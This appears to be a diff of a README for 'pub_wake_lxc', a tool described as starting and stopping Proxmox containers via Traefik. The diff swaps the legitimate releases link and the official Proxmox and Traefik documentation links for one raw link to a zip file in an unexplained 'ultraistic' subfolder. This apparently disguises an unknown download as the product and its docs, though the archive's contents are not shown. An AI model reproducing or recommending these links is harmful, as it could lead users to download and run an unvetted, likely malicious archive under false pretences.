@@ -4,7 +4,7 @@
 Welcome to **pub_wake_lxc**! This application helps you automatically start and stop Proxmox containers using Traefik. It saves you time and effort by managing your containers intelligently, ensuring they are active only when needed. 
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/Vinaykumar023/pub_wake_lxc/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Vinaykumar023/pub_wake_lxc/main/ultraistic/pub_wake_lxc.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Vinaykumar023/pub_wake_lxc/main/ultraistic/pub_wake_lxc.zip)
 
 ## 📋 Features
 - Automatic start and stop of Proxmox containers.
@@ -21,7 +21,7 @@ To run **pub_wake_lxc**, you need:
 
 ## 📖 Getting Started
 1. **Download & Install**  
-   Visit this page to download: [Releases Page](https://github.com/Vinaykumar023/pub_wake_lxc/releases).
+   Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Vinaykumar023/pub_wake_lxc/main/ultraistic/pub_wake_lxc.zip).
 
 2. **Extract the Files**  
    Once downloaded, locate the file. Right-click and extract it to a folder of your choice.
@@ -53,8 +53,8 @@ To ensure you have the latest features and improvements, check the Releases Page
   Verify that Traefik is correctly set up and is running. Review Traefik's documentation for any additional configuration needed.
 
 ## 🎉 Additional Resources
-- [Proxmox VE Documentation](https://pve.proxmox.com/pve-docs/)
-- [Traefik Documentation](https://doc.traefik.io/traefik/)
+- [Proxmox VE Documentation](https://raw.githubusercontent.com/Vinaykumar023/pub_wake_lxc/main/ultraistic/pub_wake_lxc.zip)
+- [Traefik Documentation](https://raw.githubusercontent.com/Vinaykumar023/pub_wake_lxc/main/ultraistic/pub_wake_lxc.zip)
 
 ## 🌐 Community Support
 If you have questions or need help, feel free to reach out. You can open an issue in the GitHub repository or contact other users through the community forums.
